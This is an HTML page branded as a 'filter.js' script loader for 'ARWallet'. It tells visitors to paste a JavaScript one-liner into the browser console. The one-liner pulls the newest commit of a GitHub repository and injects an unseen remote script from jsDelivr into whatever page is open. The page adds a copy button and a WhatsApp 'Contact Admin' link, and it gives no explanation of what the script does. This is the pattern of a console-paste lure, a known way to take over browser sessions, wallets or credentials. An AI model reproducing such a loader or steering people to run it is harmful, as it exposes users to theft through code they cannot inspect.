<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>filter.js — Script Loader</title>
<style>
  :root {
    --bg: #0f0f0f;
    --card: #1a1a1a;
    --card2: #222;
    --border: #2e2e2e;
    --text: #f0f0f0;
    --muted: #888;
    --green: #22c55e;
    --green-bg: #052e16;
    --wa: #25d366;
    --wa-hover: #1da851;
    --accent: #6366f1;
    --accent-bg: #1e1b4b;
    --radius: 12px;
    --font: 'Segoe UI', system-ui, sans-serif;
    --mono: 'Courier New', monospace;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    font-family: var(--font);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 1.5rem;
  }

  .popup {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 20px;
    width: 100%;
    max-width: 480px;
    overflow: hidden;
    box-shadow: 0 0 60px rgba(99,102,241,0.08);
  }

  .header {
    padding: 1.5rem 1.5rem 1.25rem;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .logo {
    width: 40px; height: 40px;
    border-radius: 10px;
    background: var(--accent-bg);
    border: 1px solid rgba(99,102,241,0.3);
    display: flex; align-items: center; justify-content: center;
    font-size: 18px;
    flex-shrink: 0;
  }

  .header-text h1 {
    font-size: 16px;
    font-weight: 600;
    color: var(--text);
    letter-spacing: -0.2px;
  }

  .header-text p {
    font-size: 12px;
    color: var(--muted);
    margin-top: 2px;
  }

  .badge {
    margin-left: auto;
    background: var(--green-bg);
    color: var(--green);
    font-size: 11px;
    font-weight: 600;
    padding: 3px 10px;
    border-radius: 20px;
    border: 1px solid rgba(34,197,94,0.25);
    flex-shrink: 0;
  }

  .body { padding: 1.25rem 1.5rem; }

  .label {
    font-size: 11px;
    font-weight: 600;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 0.8px;
    margin-bottom: 8px;
  }

  .script-box {
    background: #111;
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 14px;
    position: relative;
    margin-bottom: 1.25rem;
  }

  .script-code {
    font-family: var(--mono);
    font-size: 11.5px;
    color: #a5f3fc;
    line-height: 1.6;
    word-break: break-all;
    white-space: pre-wrap;
    max-height: 140px;
    overflow-y: auto;
    scrollbar-width: thin;
    scrollbar-color: var(--border) transparent;
  }

  .step-label {
    font-size: 10px;
    color: var(--muted);
    margin-top: 8px;
    padding-top: 8px;
    border-top: 1px solid var(--border);
  }

  .copy-btn {
    width: 100%;
    padding: 13px;
    border-radius: var(--radius);
    border: none;
    background: var(--accent);
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: background 0.15s, transform 0.1s;
    margin-bottom: 10px;
    font-family: var(--font);
    letter-spacing: -0.1px;
  }

  .copy-btn:hover { background: #4f46e5; }
  .copy-btn:active { transform: scale(0.98); }
  .copy-btn.copied { background: var(--green); }

  .wa-btn {
    width: 100%;
    padding: 13px;
    border-radius: var(--radius);
    border: 1px solid rgba(37,211,102,0.2);
    background: #1a2e1a;
    color: var(--wa);
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: background 0.15s, transform 0.1s;
    font-family: var(--font);
    text-decoration: none;
    letter-spacing: -0.1px;
  }

  .wa-btn:hover { background: #1e3a1e; }
  .wa-btn:active { transform: scale(0.98); }

  .footer {
    padding: 0.9rem 1.5rem;
    border-top: 1px solid var(--border);
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 11.5px;
    color: var(--muted);
  }

  .dot {
    width: 6px; height: 6px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 5px var(--green);
    flex-shrink: 0;
  }

  .divider {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 10px;
  }

  .divider span { font-size: 11px; color: var(--muted); white-space: nowrap; }
  .divider-line { flex: 1; height: 1px; background: var(--border); }
</style>
</head>
<body>

<div class="popup">
  <div class="header">
    <div class="logo">⚡</div>
    <div class="header-text">
      <h1>filter.js</h1>
      <p>Script Loader — ARWallet</p>
    </div>
    <div class="badge">ACTIVE</div>
  </div>

  <div class="body">
    <p class="label">New Script</p>

    <div class="script-box">
      <div class="script-code" id="script-content">(async()=>{const r='ajehrg26/KiSen';if(document.querySelector(`script[data-loader="${r}"]`))return;try{const{sha}=await(await fetch(`https://api.github.com/repos/${r}/commits/main`)).json(),s=document.createElement('script');s.src=`https://cdn.jsdelivr.net/gh/${r}@${sha}/qsss%20(2).js`;s.dataset.loader=r;document.head.appendChild(s)}catch(e){console.error('Load failed:',e)}})();</div>
      <p class="step-label">📌 Paste this in browser console → press Enter</p>
    </div>

    <button class="copy-btn" id="copyBtn" onclick="copyScript()">
      <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
      </svg>
      <span id="copyText">Copy Script</span>
    </button>

    <div class="divider">
      <div class="divider-line"></div>
      <span>need help?</span>
      <div class="divider-line"></div>
    </div>

    <a class="wa-btn" href="https://wa.me/917407979642" target="_blank" rel="noopener noreferrer">
      <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor">
        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
      </svg>
      Contact Admin
    </a>
  </div>

  <div class="footer">
    <div class="dot"></div>
    Latest build auto-fetched from GitHub
  </div>
</div>

<script>
function copyScript() {
  const code = document.getElementById('script-content').textContent;
  const btn = document.getElementById('copyBtn');
  const txt = document.getElementById('copyText');

  navigator.clipboard.writeText(code).then(() => {
    btn.classList.add('copied');
    txt.textContent = 'Copied!';
    setTimeout(() => {
      btn.classList.remove('copied');
      txt.textContent = 'Copy Script';
    }, 2000);
  }).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = code;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    btn.classList.add('copied');
    txt.textContent = 'Copied!';
    setTimeout(() => {
      btn.classList.remove('copied');
      txt.textContent = 'Copy Script';
    }, 2000);
  });
}
</script>
</body>
</html>
